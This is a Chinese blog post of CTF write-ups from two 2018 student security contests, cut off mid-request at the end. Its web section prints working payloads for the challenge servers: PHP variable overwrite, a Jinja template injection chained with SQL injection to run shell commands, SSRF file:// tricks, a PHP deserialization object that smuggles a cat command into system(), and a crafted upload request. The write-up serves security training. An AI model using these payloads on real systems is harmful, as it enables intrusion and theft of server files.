<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    省赛_上海大学生ctf_HCTF wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 36 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 17 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1542123119000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1542123119000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>省赛_上海大学生ctf_HCTF wp</h1>
    <h1 id="省赛科来杯"><a href="#省赛科来杯" class="headerlink" title="省赛科来杯"></a>省赛科来杯</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Crack-it"><a href="#Crack-it" class="headerlink" title="Crack it"></a>Crack it</h3><p>给了个shadow文件，使用<code>john</code>(kali自带)破解</p>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>写python脚本转化下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">f = open(&apos;text.txt&apos;, &apos;r&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for line in f.readlines():</span><br><span class="line">    num = line[1:]</span><br><span class="line">    if line[0] == &apos;b&apos;:</span><br><span class="line">        flag += chr(int(num, 2))</span><br><span class="line">    elif line[0] == &apos;x&apos;:</span><br><span class="line">        flag += chr(int(num, 16))</span><br><span class="line">    elif line[0] == &apos;d&apos;:</span><br><span class="line">        flag += chr(int(num))</span><br><span class="line">    elif line[0] == &apos;o&apos;:</span><br><span class="line">        flag += chr(int(num, 8))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p>给的文件里都是坐标，一开始以为要画一个二维码，一直画不出来，后来才意识到不是正方形，浪费了很长时间，写脚本写到心态有点炸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">h=900</span><br><span class="line">w=150</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(w, h))</span><br><span class="line">file = open(&quot;basic.txt&quot;,&apos;r&apos;)</span><br><span class="line">str=[]</span><br><span class="line">for m in file.readlines():</span><br><span class="line">    str.append(m[1:-2])</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">for x in range (0,w):</span><br><span class="line">    for y in range (0,h):</span><br><span class="line">        rgb=str[i].split(&apos;,&apos;)</span><br><span class="line">        pic.putpixel([x,y],(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line">        i=i+1</span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><p>仿射加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m = &apos;szzyfimhyzd&apos;</span><br><span class="line">strs = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for c in m:</span><br><span class="line">   for i in strs:</span><br><span class="line">       if ((17*(ord(i)-97)-8)%26) == (ord(c)-97):</span><br><span class="line">           flag += i</span><br><span class="line">           break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>e很大，winner attack</p>
<h3 id="神秘的代码"><a href="#神秘的代码" class="headerlink" title="神秘的代码"></a>神秘的代码</h3><p>提示异或，把给的两个文件异或下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = open(&apos;info_clear.txt&apos;,&apos;rb&apos;).read()</span><br><span class="line">b = open(&apos;info_crypt.txt&apos;,&apos;rb&apos;).read()</span><br><span class="line">oxstr =&apos;&apos;</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">    res = ord(list(a)[i]) ^ ord(list(b)[i])</span><br><span class="line">    oxstr =oxstr +chr(res)</span><br><span class="line">print oxstr</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i&apos;m not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...</span><br></pre></td></tr></table></figure>

<p>有几个大写字母，比较诡异，提出来能组成<code>THISTHEKEYIV</code></p>
<p>aes解密，ecb模式</p>
<p>然后不会了</p>
<h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>图片分离出zip压缩包，有密码</p>
<p>在给的图片的照相机信息里有一串字符串<code>73646E6973635F32303138</code>，16进制转字符串<code>sdnisc_2018</code>，就是压缩包的密码</p>
<h3 id="colors"><a href="#colors" class="headerlink" title="colors"></a>colors</h3><p>给了七张图</p>
<p>用stegsolve看下发现每张图都藏着字母，组合起来<code>MakeMetall</code></p>
<p>把图像高度变高，发现图片下边都有黑白方块，想到二进制转为01</p>
<p>但是。。。是竖着读的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 0 1 1 1 1</span><br><span class="line">1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1</span><br><span class="line">0 0 0 0 1 1 0 0 1 0 1 0 1 0 1 1 0 0 0 1</span><br><span class="line">0 1 0 0 1 0 1 0 0 1 0 0 0 0 0 0 1 1 0 1</span><br><span class="line">1 1 0 1 0 0 1 1 0 1 1 1 0 1 0 1 0 1 1 1</span><br><span class="line">1 0 0 1 1 0 1 1 0 1 1 0 1 0 1 1 0 1 1 0</span><br><span class="line">0 0 1 1 1 0 0 1 1 0 1 1 0 1 1 1 1 1 0 1</span><br><span class="line"></span><br><span class="line">1100110</span><br><span class="line">1101100</span><br><span class="line">1100001</span><br><span class="line">1100111</span><br><span class="line">1111011</span><br><span class="line">1010000</span><br><span class="line">1101110</span><br><span class="line">1100111</span><br><span class="line">0110001</span><br><span class="line">1101110</span><br><span class="line">0110111</span><br><span class="line">1100101</span><br><span class="line">1110010</span><br><span class="line">1000101</span><br><span class="line">1110011</span><br><span class="line">0110111</span><br><span class="line">1101001</span><br><span class="line">1101111</span><br><span class="line">1100110</span><br><span class="line">1111101</span><br><span class="line"></span><br><span class="line">flag&#123;Png1n7erEs7iof&#125;</span><br></pre></td></tr></table></figure>

<h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>zip明文攻击</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h3><p>icmp方式中有一句flagishere，flag就在这条上边的记录里，一个一个字拼起来得到flag</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>sql盲注注入的日志，找到最后二十五条，得到flag每位的asc码</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>改xff头，cookie</p>
<h3 id="babyweb2"><a href="#babyweb2" class="headerlink" title="babyweb2"></a>babyweb2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    include &apos;here.php&apos;;</span><br><span class="line">    $key = &apos;kelaibei&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">        $id = $_GET[&apos;id&apos;];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        if ($key[99] != &apos;aabg7XSs&apos; &amp;&amp; md5($key[99]) == md5(&apos;aabg7XSs&apos;)) &#123;</span><br><span class="line">           echo $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &apos;try again&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parse_str变量覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.148.65:29002/?id=key[99]=s1091221200a</span><br></pre></td></tr></table></figure>

<p>然后是一个上传数据的页面，上传完访问提示<code>too slow</code>，说明要快点访问到</p>
<p>burp不断发访问文件的数据包，再发一个上传文件的数据包，得到flag</p>
<p><img src="https://s1.ax1x.com/2018/11/06/ioHvAU.png" alt="ioHvAU.png"></p>
<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>sql注入+模板注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">0x7b7b5b5d2e5f5f636c6173735f5f2e5f5f62617365735f5f5b305d2e5f5f737562636c61737365735f5f28295b35395d2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e2827636174202f666c616727292e7265616428297d7d</span><br><span class="line"></span><br><span class="line">?username=daolgts&apos;union+select+1,2,0x7b7b5b5d2e5f5f636c6173735f5f2e5f5f62617365735f5f5b305d2e5f5f737562636c61737365735f5f28295b35395d2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e2827636174202f666c616727292e7265616428297d7d%23</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2018/11/06/ioHxNF.png" alt="ioHxNF.png"></p>
<h1 id="2018-上海市大学生网络安全大赛线上"><a href="#2018-上海市大学生网络安全大赛线上" class="headerlink" title="2018 上海市大学生网络安全大赛线上"></a>2018 上海市大学生网络安全大赛线上</h1><h2 id="web1-what-are-you-doing"><a href="#web1-what-are-you-doing" class="headerlink" title="web1 what are you doing?"></a>web1 what are you doing?</h2><p>最后一步ssrf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://www.ichunqiu.com/../var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web2-Can-you-hack-me"><a href="#web2-Can-you-hack-me" class="headerlink" title="web2 Can you hack me?"></a>web2 Can you hack me?</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class come&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">    function echo($host)&#123;</span><br><span class="line">        system(&quot;echo $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=&apos;hi&apos;;</span><br><span class="line">$var=&apos;var&apos;;</span><br><span class="line">$bbb=&apos;bbb&apos;;</span><br><span class="line">$ccc=&apos;ccc&apos;;</span><br><span class="line">$i=1;</span><br><span class="line">foreach($_GET as $key =&gt; $value) &#123;</span><br><span class="line">        if($i===1)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($first===&quot;doller&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[&apos;a&apos;]);</span><br><span class="line">    if($var===&quot;give&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if($bbb===&quot;me&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            if($ccc===&quot;flag&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;;</span><br><span class="line">                $come=@$_POST[&apos;come&apos;];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;NO&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Can you hack me?&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>变量覆盖</p>
<p>然后构造反序列化执行命令</p>
<p>双写flag绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">come=O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:4:&quot;echo&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;i:0;s:19:&quot;2&amp;&amp;cat$IFS/flflagag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>分割flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">come=O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:4:&quot;echo&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;s:4:&quot;host&quot;;s:20:&quot;123&amp;cat$&#123;IFS&#125;/fl&quot;&quot;ag&quot;;&#125;&#125;123</span><br></pre></td></tr></table></figure>

<p>键值为<code>0</code>或者<code>host</code>都可以，注意<code>private</code>变量序列化后会加上类名和不可见字符<code>\00</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class daolgts&#123;</span><br><span class="line">    private $test1=&quot;hello&quot;;</span><br><span class="line">    public $test2=&quot;hello&quot;;</span><br><span class="line">    protected $test3=&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new daolgts();</span><br><span class="line">echo serialize($test);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:7:&quot;daolgts&quot;:3:&#123;s:14:&quot;%00daolgts%00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;%00*%00test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web3-GOOD-JOB"><a href="#web3-GOOD-JOB" class="headerlink" title="web3 GOOD JOB"></a>web3 GOOD JOB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //error_reporting(0);</span><br><span class="line">    //$dir=md5(&quot;icq&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    $dir=md5(&quot;icq&quot;);</span><br><span class="line">    $sandbox = &apos;/var/sandbox/&apos; . $dir;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123;</span><br><span class="line">        $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">        if (!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">            die(&quot;emmmm...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">        $_ = $_POST[&apos;hehe&apos;];</span><br><span class="line">        if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos; &amp;&amp; strpos($_,$new_name)===false)&#123;</span><br><span class="line">            include($_);</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先数组绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">    die(&quot;emmmm...&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传file[0]和file[2]，count()函数会记为2，$filename[count($filename) - 1]就是$file[1],而$file[1]是没有的，也就是空，if语句判断为假，不会执行die</p>
<p>测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo $ext;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo count($filename);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $filename[count($filename) - 1];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2018/11/08/iH4SHO.png" alt="iH4SHO.png"></p>
<p>然后用 <code>/.</code> 绕过 unlink</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php?cmd=system(&apos;cat+/flag&apos;); HTTP/1.1</span><br><span class="line">Host: 192.168.214.134</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------5894518712413</span><br><span class="line">Content-Length: 527</span><br><span class="line"></span><br><span class="line">-----------------------------5894518712413</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[0]&quot;</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line">-----------------------------5894518712413</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[2]&quot;</span><br><span class="line"></span><br><span class="line">php/.</span><br><span class="line">-----------------------------5894518712413</span><br><span class="line">Content-Disposition: form-data; name=&quot;hehe&quot;</span><br><span class="line"></span><br><span class="line">162.php</span><br><span class="line">-----------------------------5894518712413</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.php&quot;</span><br><span 